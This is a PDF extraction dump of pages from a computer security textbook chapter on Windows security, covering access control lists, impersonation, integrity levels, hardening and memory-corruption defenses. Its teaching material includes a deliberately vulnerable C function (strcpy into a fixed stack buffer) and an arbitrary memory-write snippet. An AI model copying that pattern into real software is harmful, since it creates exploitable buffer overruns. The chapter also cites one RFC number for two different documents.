       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 837, 'page_label': '26-8'}, page_content='26-8  CHAPTER 26 / WindoWS  S EC u R i T y\\nA sample SD with no SACL is as follows:\\nOwner: CORP\\\\Blake\\nACE[0]: Allow CORP\\\\Paige Full Control\\nACE[1]: Allow Administrators Full Control\\nACE[2]: Allow CORP\\\\Cheryl Read, Write, and Delete\\nThe DACL in this SD allows the user named Paige (from the CORP domain) \\nfull access to the object; she can do anything to this object. Members of the Adminis-\\ntrators can do likewise. Cheryl can read, write, and delete the object. Note the object \\nowner is Blake; as the owner, he can do anything to the object as well. This was always \\nthe case until the release of Windows Vista. Some customers do not want owners to \\nhave such unbridled access to objects, even though they created them. In Windows \\nVista and later, you can include an Owner SID in the DACL, and the access mask \\nassociated with that account applies to the object owner.\\nThere are two important things to keep in mind about access control in  W\\nindows. \\nFirst, if the user accesses an object with the SD example above, and the user is not \\nBlake, not Paige, not Cheryl, and not a member of the Administrator’s group, then \\nthat user is denied to access the object. There is no implied access. Second, if Cheryl \\nrequests read access to the object, she is granted read access. If she requests read and \\nwrite access, she is also granted access. If she requests create access, she is denied \\naccess unless Cheryl is also a member of the Administrators group, because the \\n“Cheryl ACE” does not include the “create” access mask. The last point is critically \\nimportant. When a Windows application accesses an object, it must request the type \\nof access the application requires. Many developers would simply request “all access” \\nwhen in fact the application may only want to read the object. If Cheryl uses an appli-\\ncation that attempts to access the object described above and the application requests \\nfull access to the object she is denied to access the object unless she is an administra-\\ntor. This is the prime reason why so many applications failed to execute correctly on \\nWindows XP and later, unless the user is a member of the Administrator’s group.\\nWe mentioned earlier that a DACL grants or denies access; technically, this is \\nnot 100% accurate. Each ACE in the DACL determines access; an ACE can be an \\nallow ACE or a deny ACE. Look at this variant of the previous SD:\\nOwner: CORP\\\\Blake\\nACE[0]: Deny Guests Full Control\\nACE[1]: Allow CORP\\\\Paige Full Control\\nACE[2]: Allow Administrators Full Control\\nACE[3]: Allow CORP\\\\Cheryl Read, Write, and Delete\\nNote the first ACE is set to deny members of the guests account full control to \\nthe object. Basically, guests are out of luck if they attempt to access the object pro-\\ntected by this SD. Deny ACEs are not often used in Windows because they can be \\ncomplicated to troubleshoot. Also note the first ACE is the deny ACE; it is important \\nthat deny ACEs come before allow ACEs because Windows evaluates each ACE in \\nthe ACL until access is granted or explicitly denied. If the ACL grants access, then \\nWindows will stop ACL evaluation, and if the deny ACE is at the end of the ACL, \\nM26_STAL0611_04_GE_C26.indd   8 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 838, 'page_label': '26-9'}, page_content='26.1 / FundAME n TAL W indoWS SEC u R i T y  ARCH i TECT u RE   26-9\\nthen it is not evaluated, so the user is granted access even if the account may be \\ndenied access. When setting an ACL from the user interface, Windows will always \\nput deny ACEs before allow ACEs, but if you create an ACL programmatically (e.g., \\nby using the SetSecurityDescriptorDacl function), you must explicitly place the deny \\nACEs first.\\nYou can get an object’s SD using PowerShell with the following syntax:\\nget-acl c:\\\\folder\\\\file.txt | format-list\\nYou can also use the set-acl cmdlet to set an object’s DACL or SACL.\\nIn current versions of Windows, it is possible to set and get an SD using the \\nSecurity Descriptor Definition Language (SDDL). SDDL is simply a text represen-\\ntation of a SD. The ConvertStringSecurityDescriptorToSecurityDescriptor() function \\ncan be used to convert SDDL text into a binary SD, which can then be assigned to \\nan object.\\nThe authorization framework in Windows also supports “conditional ACEs” \\nwhich allows application-level access condition to be evaluated when an access check \\nis performed. Examples could include business logic. For example, a conditional ACE \\nto encapsulate the following business rule:\\nUser is a Manager in Sales or Marketing\\nAs:\\n(Title==”Manager” && (Division==”Sales” || Division== \\n”Marketing”))\\nNote there is no user interface to define these rules, these can only be set using \\nprogrammatic access to SDDL.\\nAccess Checks\\nIt is now time to put these all together. When a user account attempts to access a \\nprotected object, the operating system performs an access check. It does this by com-\\nparing the user account and group information in the user’s token and the ACEs in \\nthe object’s ACL. If all the requested operations (read, write, delete, and so on) are \\ngranted, then access is granted; otherwise, the user gets an access-denied error status \\n(error value 5).\\nImpersonation\\nThere is one last thing you should understand about Windows. Windows is a multi-\\nthreaded operating system, which means a single process can have more than one \\nthread of execution at a time. This is very common for both server and client applica-\\ntions. For example, a word processor might have one thread accepting user input, and \\nanother performing a background spellcheck. A server application, such as a database \\nserver, might start a large number of threads to handle concurrent user requests. Let’s \\nsay the database server process runs as a predefined account named DB_ACCOUNT; \\nwhen it takes a user request, the application can impersonate the calling user by \\ncalling an impersonation function. For example, one networking protocol supported \\nby Windows is called Named Pipes, and the ImpersonateNamedPipeClient function \\nM26_STAL0611_04_GE_C26.indd   9 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 839, 'page_label': '26-10'}, page_content='26-10  CHAPTER 26 / WindoWS  S EC u R i T y\\nwill impersonate the caller. Impersonation means setting the user’s token on the \\ncurrent thread. Normally access checks are performed against the process token, but \\nwhen a thread is impersonating a user, the user’s token is assigned to the thread, and \\nthe access check for that thread is performed against the token on the thread, not \\nthe process token. When the connection is done, the thread “reverts,” which means \\nthe\\xa0token is dropped from the thread.\\nSo why impersonate? Imagine if the database server accesses a file named \\ndb.txt, and the DB_ACCOUNT account has read, write, delete, and update per -\\nmission on the file. Without impersonation, any user could potentially read, write, \\ndelete, and update the file. With impersonation, it is possible to restrict who can do \\nwhat to the db.txt file.\\nIn older versions of Windows, a process listening on a named pipe running as \\nany account could impersonate the connected user. But since the mid-2000s, this was \\nchanged to only allowing accounts granted the “Impersonate a client after authenti-\\ncation” privilege to impersonate users. By default, service accounts and administra-\\ntive accounts have this privilege.\\nMandatory Access Control\\nWindows Vista, Windows Server 2008, and later include an additional authorization \\ntechnology named Integrity Control, which goes one step beyond DACLs. DACLs \\nallow fine-grained access control, but integrity controls limit operations that might \\nchange the state of an object. The general premise behind integrity controls is simple; \\nobjects (such as files and processes) and principals (such as users) are labeled with \\none of the following integrity levels:\\n•\\n Low integrity (S-1\\n-16-4096)\\n•\\n Medium integrity (S-1\\n-16-8192)\\n•\\n High integrity (S-1\\n-16-12288)\\n•\\n S\\nystem integrity (S-1 -16-16384)\\nNote the SIDs after the integrity levels. Microsoft implemented integrity levels \\nusing SIDs. For example, a high-integrity process will include the S-1 -16-12288 SID \\nin the process token. If a subject or object does not include an integrity label, then \\nthe subject or object is deemed medium integrity.\\nThe screen shot of Figure 26.1 shows a normal user token in Windows Vista \\nor Windows 7. It includes medium-integrity SID, which means this user account \\nis medium integrity and any process run by this user can write only to objects of \\nmedium and lower integrity.\\nWhen a write operation occurs, Windows will first checks to see if the subject’s \\nintegrity level dominates the object’s integrity level, which means the subject’s integrity \\nlevel is equal to or above the object’s integrity level. If it is, and the normal DACL check \\nsucceeds, then the write operation is granted. The most important component in Win-\\ndows that uses integrity controls is Internet Explorer 7.0 and later. Integrity controls \\nhelp create a sandbox; the main iexplore.exe process that renders and hosts poten-\\ntially hostile markup and mobile code from the Internet runs at low integrity, but the \\nmajority of the operating system is marked medium or higher integrity, which means \\nmalicious code inside the browser has a harder time writing to the operating system.\\nM26_STAL0611_04_GE_C26.indd   10 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 840, 'page_label': '26-11'}, page_content='26.2 / WindoWS V u L n ERAB i L i T i ES   26-11\\nThat completes this whirlwind tour of Windows security principles. Now let’s \\nshift focus to security defenses within Windows.\\n 26. 2  WINDO WS VULNERABILITIES\\nWindows, like all operating systems, has security bugs, and a number of these bugs \\nhave been exploited by attackers to compromise customer operating systems. After \\n2001, Microsoft decided to change its software development process to better accom-\\nmodate secure design, coding, testing, and maintenance requirements, with one goal \\nin mind: reduce the number of vulnerabilities in all Microsoft products. This process \\nimprovement is called the Security Development Lifecycle [HOWA06]. The core \\nSDL requirements are as follows:\\n•\\n Mandatory security education\\n•\\n Secur\\ne design requirements\\nFigure 26.1 Scr een Shot of User Account in Windows Vista\\nSource: From Microsoft® Windows Vista, Microsoft Corporation. Reprinted \\nwith permission Microsoft Corporation.\\nM26_STAL0611_04_GE_C26.indd   11 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 841, 'page_label': '26-12'}, page_content='26-12  CHAPTER 26 / WindoWS  S EC u R i T y\\n• T hreat modeling\\n•\\n At\\ntack surface analysis and reduction\\n•\\n Secur\\ne coding requirements and tools\\n•\\n Secur\\ne testing requirements and tools\\n•\\n Security push\\n•\\n F\\ninal security review\\n•\\n Security r\\nesponse\\nA full explanation of SDL is beyond the scope of this chapter, but the net effect \\nhas been an approximately 50% reduction in security bugs. Windows Vista is the first \\nversion of Windows to have undergone SDL from start to finish. Other versions of \\nWindows had a taste of SDL, such as Windows XP SP2, but Windows XP predates \\nthe introduction of SDL at Microsoft.\\nSDL does not equate to “bug free” and the process is certainly not perfect, but \\nthere have been some major SDL success stories. Microsoft’s Web server, Internet \\nInformation Services (IIS), has a much-maligned reputation because of serious bugs \\nfound in the product that led to worms, such as CodeRed. IIS version 6, included with \\nWindows Server 2003, has had a stellar security track record since its release; there \\nhave been only three reported vulnerabilities in the four years since its release, none \\nof them is critical. And this figure is an order of magnitude less bugs than IIS’s main \\ncompetitor, Apache [HOWA04].\\nAnother example of SDL working is Microsoft’s database server, SQL Server.  \\nIn the same period, there have been less than 10 security vulnerabilities in SQL \\nServer. When compared to SQL Server’s major competitor “Unbreakable Oracle,” \\nthis is a significant engineering feat.\\nThe most visible part of any vendor’s security process is patch management, \\nand Microsoft has substantially fine-tuned the security update process over the last \\nfew years. At first, Microsoft issued security updates as soon as they were ready, \\nbut now Microsoft issues security updates the second Tuesday of each month. This \\nday is now affectionately referred to as “Patch Tuesday.” More recently, Microsoft \\nintroduced a novel idea; the Thursday before the second Tuesday of each month, \\nMicrosoft announces how many security updates will be shipped, for which prod-\\nucts, and what the highest severity rating will be. This streamlined security update \\nprocess gives system administrators to have some much-needed predictability to \\ntheir busy schedules.\\n 26. 3  WINDO WS SECURITY DEFENSES\\nThis section and the next will focus on defenses within Windows. The defenses can \\nbe grouped into four broad categories:\\n1.\\n A\\nccount defenses\\n2.\\n Network defenses\\n3.\\n Memory Corruption defenses\\n.\\n4.\\n Br\\nowser defenses.\\nM26_STAL0611_04_GE_C26.indd   12 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 842, 'page_label': '26-13'}, page_content='26.3 / WindoWS SEC u R i T y  d EFE n SES   26-13\\nWe discuss each in detail, most notably as each relates to Windows Vista and \\nlater.\\nAll versions of Windows offer security defenses, but the list of defenses has \\ngrown rapidly in the last twenty years to accommodate increased Internet-based \\nthreats. The attackers today are not just kids; they are criminals who see money in \\ncompromised computers. A zombie network comprised of a few thousand computers \\nunder the control of an attacker could be trained on an e-commerce site for a few \\nhours, effectively knocking it off the Internet, losing sales and potential customers. \\nThe attack stops when the extortion money is paid. Again, we want to stress that \\nattacks and compromises are very real, and the attackers are highly motivated by \\nmoney. Attackers are no longer just young, anarchic miscreants; they are real crimi-\\nnals, and in many cases, well-funded nations.\\nBefore we discuss security defenses, we discuss system hardening, which is criti-\\ncal to the defensive posture of a computer system and network.\\nWindows System Hardening Overview\\nThe process of hardening is shoring up defenses, reducing the amount of function-\\nality exposed to untrusted users, and disabling less-used features. At Microsoft, this \\nprocess is called Attack Surface Reduction. The concept is simple: Apply the 80/20 \\nrule to features. If the feature is not used by 80% of the population, then the fea-\\nture should be disabled by default. While this is the goal, it is not always achievable \\nsimply because disabling vast amounts of functionality makes the product unusable \\nfor nontechnical users, which leads to increased support calls and customer frustra-\\ntion. One of the simplest and effective ways to reduce attack surface is to replace \\nanonymous networking protocols with authenticated networking protocols. The \\nbiggest change of this nature in Windows XP SP2 was to change all anonymous \\nremote procedure call (RPC) access to require authentication. This was a direct \\nresult of the Blaster worm. Worms spread anonymously, and making this simple \\nchange to RPC will help prevent worms that take advantage of vulnerabilities \\nin RPC code, and code that uses RPC. It turns out that, in practice, requiring \\nauthentication is a very good defense; the Zotob worm, which took advantage \\nof a vulnerability in Microsoft Plug and Play (PnP) and was accessible through \\nRPC, did not affect Windows XP SP2, even the coding bug was there, because an \\nattacker must be authenticated first. But perhaps the beauty of using authentica-\\ntion to reduce attack surface is that most users don’t even know it is there, yet the \\nuser is protected.\\nAnother example of hardening Windows occurred in Windows Server 2003. \\nBecause Windows Server 2003 is a server and not a client platform, the Web browser \\nInternet Explorer was stripped of all mobile code support by default.\\nIn general, hardening servers is easier than hardening clients for the following \\nreasons:\\n1.\\n Servers tend to be used for very specific and contr\\nolled purposes, while client \\ncomputers are used for more general purpose.\\n2.\\n W\\nhether it is true or not, the perception is that server users are administrators \\nand have more computer configuration skills than a typical client computer \\nuser.\\nM26_STAL0611_04_GE_C26.indd   13 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 843, 'page_label': '26-14'}, page_content='26-14  CHAPTER 26 / WindoWS  S EC u R i T y\\nAccount Defenses\\nAs noted earlier, user accounts can contain highly privileged SIDs (such as the \\nAdministrators or Account operators groups) and dangerous privileges (such as \\nAct as part of operating system), and malicious software running with these SIDs or \\nprivileges can wreak havoc. The principle of least privilege dictates that users should \\noperate with just enough privilege to get the tasks done, and no more. Historically, \\nWindows XP users operated by default as members of the local Administrators \\ngroup; this was done simply for application compatibility reasons. Many applications \\nthat used to run on Windows 95, 98, and Me would not run correctly on Windows \\nXP unless the user was an administrator. In other words, in some cases a Windows \\nXP user running as a “Standard User” could run into some errors. Of course, there \\nis nothing stopping a user from running as a “Standard User.”\\nWindows XP and Windows Server 2003 add a new feature named “Secondary \\nLogon,” which allows a user account to right click an application, select “Run as\\xa0.\\xa0.\\xa0.\\xa0,” \\nthen enter another user account and password to run the application. Windows XP \\nand Windows Server 2003 also include support for another way to reduce privilege \\non a per-thread level, called a restricted token. A restricted token is simply a thread \\ntoken with privileges removed and/or SIDs marked as deny-only SIDs. You can learn \\nmore about restricted tokens and how to use them programmatically or through \\nWindows Policy [HOWA04].\\nWindows Vista and later change the default; all user accounts are users and not \\nadministrators. This is referred to as User Account Control (UAC.)\\nWhen a user wants to perform a privileged operation, the user is prompted to \\nenter an administrator’s account name and password. If the user is an administrator, \\nthe user is prompted to give consent to the operation. This is often referred to as \\n“over the shoulder logon.” The reason for doing this is if malware attempts to per-\\nform a privileged task, the user is notified. Note in the case of Windows Server 2008 \\nand later, if a user enters a command in the Run dialog box from the Start menu, the \\ncommand will always run elevated if the user is normally an administrator and will \\nnot prompt the user. The great amount of user interaction required to perform these \\nprivileged operations mitigates the threat of malware performing tasks off the Run \\ndialog box.\\nLow PriviLege service accounts Windows services are long-lived processes that \\noften start right after the computer boots. Examples include the File and Print ser -\\nvice and the DNS service. Many such services run with elevated privileges because \\nthey perform privileged operations. It is true, however, that many services do not \\nneed such elevated requirements, and in Windows XP , Microsoft added two new \\nservice accounts: the Local Service account and the Network service account, which \\nallow a service local or network access, respectively, but processes running with these \\naccounts operate at a much lower privilege level. Note that unlike the system account, \\nneither the local service nor the network service accounts are members of the local \\nadministrator’s group.\\nIn Windows XP SP2, Microsoft made an important change to the remote proce-\\ndure call service (RPCS) as an outcome of the Blaster worm. In versions of Windows \\nprior to Windows XP SP2, RPCSs ran as the System account, the most privileged \\naccount in Windows. For Windows XP SP2, a major architectural change was made; \\nM26_STAL0611_04_GE_C26.indd   14 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 844, 'page_label': '26-15'}, page_content='26.3 / WindoWS SEC u R i T y  d EFE n SES   26-15\\nRPCSs was split in two. The reason RPCSs ran with System identity was simply to \\nallow it to execute Distributed Component Object Model (DCOM, which layered \\non top of RPC) objects on a remote computer correctly, but raw RPC traffic does \\nnot require such elevated privileges. So RPCSs was rearchitected into components, \\nRPCSs shed its DCOM activation code, and a new service was created called the \\nDCOM Server Process Launcher. RPCSs runs as the lower-privilege Network ser-\\nvice account; DCOM runs as SYSTEM. This is a good example of the principle of \\nleast privilege and separation of privilege in action. Apache, OpenSSH, and \\n Internet \\n Information Services (IIS) 6 and later also use this model.\\n A small amount of code \\nruns with elevated identity, and related components run with lower identity. In the \\ncase of Apache on Linux, the initial httpd daemon runs as root because it must open \\nport\\xa080; once the port is open httpd spawns “worker” httpd dameons as \\n lower\\n-privilege \\naccounts such as nobody or Apache. It is these worker processes that receive poten-\\ntially malicious input. IIS6 follows a similar model, a process named inetinfo starts \\nunder the System identity because it must perform administrative tasks, and it starts \\nworker processes named w3wp.exe to handle user requests (these processes run \\nunder the lower-privilege network service identity).\\nstriPPing PriviLeges Another useful defense, albeit not often used in Windows, is \\nto strip privileges from an account when the application starts. This should be per -\\nformed very early in the application startup code (e.g., early in the application’s main \\nfunction). The best way to describe this is by way of example. In Windows, the Index \\nserver process runs as the system account because it needs administrative access to \\nall disk volumes to determine if any file has changed, it can reindex the file. Only \\nmembers of the local Administrators group can get a volume handle. This is the sole \\nreason Index server must run as the system account, yet as you will remember, the \\nsystem account is bristling with dangerous privileges, such as the TCB privilege and \\nbackup privilege. So when the main index server process starts (cidaemon.exe), it \\nsheds any unneeded privileges as soon as possible. The function that performs this is \\nAdjustTokenPrivileges.\\nWindows Vista and later also add a function to define the set of privi-\\nleges required by a service to run correctly. The function that performs this is \\nChangeServiceConfig2.\\nThat ends the overview of core-user account-related security defenses and tech-\\nnologies. Now let’s switch our focus to network defenses.\\nNetwork Defenses\\nThere is one big problem with defenses that focus on the user and user accounts: \\nThey do nothing to protect computers from low-level network attacks. Many users \\nand industry pundits focus on “users-as-non-admins” and sometimes lose sight of \\nattacks that do not require human interaction. No user confirmation, no user-based \\nleast-privilege defense will protect a computer from an attack that takes advantage \\nof a vulnerability in a network facing process that has no user interaction, such as \\nDNS server, e-mail server, or Web server. As Sun Tzu said in The Art of War, “So in \\nwar, the way is to avoid what is strong and to strike at what is weak.” If a software \\nproduct shores up its defenses in one area, it must shore them up everywhere else \\nin the product.\\nM26_STAL0611_04_GE_C26.indd   15 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 845, 'page_label': '26-16'}, page_content='26-16  CHAPTER 26 / WindoWS SECuRiTy\\nWindows offers many network defenses, most notably native IPSec and IPv6 \\nsupport, and a bi-directional firewall.\\niPsec anD iPv6 The reason why distributed denial-of-service (DDoS) attacks occur \\nis because IPv4 is an unauthenticated protocol. UDP is one of the worst offenders \\nbecause it is a connectionless protocol, and it is trivial to spoof UDP packets. But \\neven with TCP , the initial SYN packet is unauthenticated, and a set of attack servers \\ncould easily incapacitate a vulnerable server on the Internet by sending millions of \\nbogus TCP SYN packets, as we discuss in \\nChapter 7. There are many other kinds of \\nTCP/IP-related issues, and the IETF is currently discussing the issues in depth. Two \\nIETF documents of interest are RFC 4953 (Defending TCP Against Spoofing Attacks, \\nJuly 2007) and RFC 4953 (TCP SYN Flooding Attacks and Common Mitigations, \\nAugust 2007).\\nThe problem with any potential solution that uses IPv4 is that IPv4 is funda-\\nmentally flawed. Enter IPSec and IPv6. IPSec and IPv6 both support authenticated \\nnetwork packets, as we discuss in Chapter 22.5. In Windows Vista and later, IPv6 \\nis enabled by default. IPv4 is enabled by default as well, but over time,  Microsoft\\n \\nanticipates that more of the world’s networks will migrate to the much more secure \\nprotocol. A good example of this is the XBOX Live online network. The core \\nXBOX operating system is a stripped-down version of Windows, but its core net-\\nworking protocol is essentially IPSec. The XBOX Live team did not want to use \\nIPv4 because the team knew their servers would be under constant DDoS attack. \\nRequiring IPSec substantially raises the bar on the attackers.\\nfirewaLL All versions of Windows since Windows XP have included a built-in soft-\\nware firewall. The version included with Windows XP was limited in that (1) it was \\nnot enabled by default, and (2) its configuration was limited to blocking only inbound \\nconnections on specific ports. The firewall in Windows XP SP2 was substantially \\nimproved to address one core issue: Users with multiple computers in the home \\nwanted to share files and print documents, but the old firewall would only allow this \\nto happen if the file and print ports (TCP 139 and 445) were open to the Internet. So \\nin Windows XP SP2, there is an option to open a port, but only on the local subnet. \\nThe other change in Windows XP SP2, and by far the most important, is that the \\nfirewall is enabled by default.\\nWindows Vista and later add two other functions. First the firewall is a fully \\nintegrated component of the rewritten TCP/IP networking stack. Second, the firewall \\nsupports optionally blocking outbound connections. Some analysts believe blocking \\noutbound connections is “security theater,” not real security. Here’s why. Let’s say \\na user has a browser installed (it doesn’t matter which one), and the user allows the \\nbrowser to make outbound connections without prompting the user for confirmation. \\nMalware writers will simply leverage the browser to run their malicious code from \\nwithin the browser, so to the firewall, it looks like the browser is making the request, \\nwhich is true. The firewall in Windows Vista is intended for management and policy \\nenforcement, not for protection against malicious code.\\nAll firewalls that support outbound connection blocking can easily be circum-\\nvented unless the user wishes to be prompted for every single outbound connection, \\nin which case the user will totally frustrated after 10 minutes of typical use on the \\nInternet.\\nM26_STAL0611_04_GE_C26.indd   16 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 846, 'page_label': '26-17'}, page_content='26.3 / WindoWS SECuRiTy dEFEnSES  26-17\\nLet’s now discuss another set of defensive technologies in Windows: buffer \\noverrun defenses.\\nMemory Corruption Defenses\\nIn the previous edition, this section was entitled “Buffer Overrun Defenses,” but in \\nthe author’s opinion, the term “buffer overrun” is much too restrictive. Any form of \\nmemory corruption, be it caused by overwriting the end of the buffer, underrunning \\na buffer, or writing data to arbitrary memory locations can be catastrophic.\\nMost operating systems today, indeed much software in use today, is written in the \\nC and C+ + programming languages. C was designed as a high-level assembly language, \\nand because of that requirement, C gives the developer direct access to memory through \\npointers, as we discuss in Chapter 10. Pointers simply point to a memory location. For \\n example,\\n in the following code snippet, the pointer p points to an array of 32 characters  \\n(a character is an 8-bit value) named password.\\nchar password[32];\\nchar *p = password; \\nWith this powerful functionality comes risk: the ability to corrupt memory. \\nBecause of the risks of using C and C+ +, most people’s first reaction is, “why not \\njust rewrite everything in [insert language dejour]?” There are two reasons. The first \\nis the same reason that the world’s cars do not run on hydrogen. It is a great idea, \\nand it is good for the planet, but gasoline has a massive momentum behind it because \\npeople know how to get oil from the ground, refine it, ship it, store it, pump it, build \\nengines that use it, repair engines that use it, and so on. There are also problems with \\nhydrogen that still make it impractical today. The same reasoning applies for replac-\\ning C and C+ + with Java or C#. These languages and run-time environments are not \\nquite up to the task for building operating systems. That may change in the future, but \\nit will be a monumental task to convert C and C+ + code to Java or C#.\\nThe other reason is that simply replacing C and C+ + with another language \\ndoes not solve the real problem, which is that software developers have too much \\ntrust in the data they receive.\\nMemory corruption vulnerabilities when the application does not constrain \\nwrite operations to the correct memory locations. For example, a buffer overrun \\noccurs because the developer expects a buffer of 32 bytes, and the attack provides a \\nbuffer that is larger. In the author’s opinion, the real way to solve the buffer overrun \\nproblem is to teach new developers (and jaded developers, for that matter) the simple \\nrule of never trusting input and to identify data as the data enter the system and to \\nsanitize or reject the data, as we discuss in \\nChapter 11.\\nTaking the example code above, the following is a classic buffer overrun \\nexample:\\nvoid ParseData(char *pwd) {\\n   char password[32];\\n   strcpy(password, pwd);\\n   // etc.\\n}\\nM26_STAL0611_04_GE_C26.indd   17 10/11/17   3:21 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 847, 'page_label': '26-18'}, page_content='26-18  CHAPTER 26 / WindoWS SECuRiTy\\nThe problem with this code is that the strcpy function continues copying pwd \\ninto password and stops only when it hits a NULL character (‘\\\\0’) in the source string, \\npwd. If the attacker controls pwd, then he or she can determine where the trailing \\nNULL resides, and if the attacker decided to place it after the 32nd character in pwd, \\nstrcpy overflows the password buffer. This example is a classic “stack smash,” because \\nthe buffer overflow corrupts the password buffer, which resides on the function’s \\nstack.\\nHere is another example:\\nchar t[64];\\nt[x] = y;\\nIn this example, if the attacker controls “x”, then he can write “y” to any loca-\\ntion in memory.\\nSo let’s look at some of the stack defenses enabled by default in Windows today.\\nstack-baseD buffer overrun Detection (/gs) Normally in Windows, a func-\\ntion’s stack looks like \\nFigure 26.2a. You will notice two interesting items on the stack, \\nEBP (extended base pointer) and EIP (extended instruction pointer). When the func-\\ntion returns, it must continue execution at the next instruction after the instruction \\nthat called this function. The CPU does this by taking the values off the stack (called \\npopping) and populating the EBP and EIP registers. Here is where the fun starts. \\nIf the attacker can overflow the buffer on the stack, he or she can overrun the data \\nused to populate the EBP and EIP registers with values under his or her control and \\nhence change the application’s execution flow. The source code for Windows XP SP2 \\nis compiled with a special compiler option in Microsoft Visual C+ + to add defenses \\nto the function’s stack. The compiler switch is /GS, and it is usable by anyone with \\naccess to a Visual C+ + compiler. Once the code is compiled with this option, the \\nstack is laid out as shown in Figure 26.2b.\\nAs you can see, a cookie has been inserted between stack data and the func-\\ntion return address. This random value is checked when the function exits, and if the \\ncookie is corrupted, the application is halted. You will also notice that buffers on the \\nstack are placed in higher memory than nonbuffers, such as function pointers, C+ + \\nFigure 26.2 Stack La yout in Windows Vista\\nBuﬀers EBP\\n(a) Without /GS option  \\n(b) With /GS option  \\nEIP Function\\nArguments\\nNon\\nBuﬀers\\nBuﬀers EBPCookie EIP Function\\nArguments\\nNon\\nBuﬀers\\nM26_STAL0611_04_GE_C26.indd   18 10/11/17   3:21 PM'),\n",
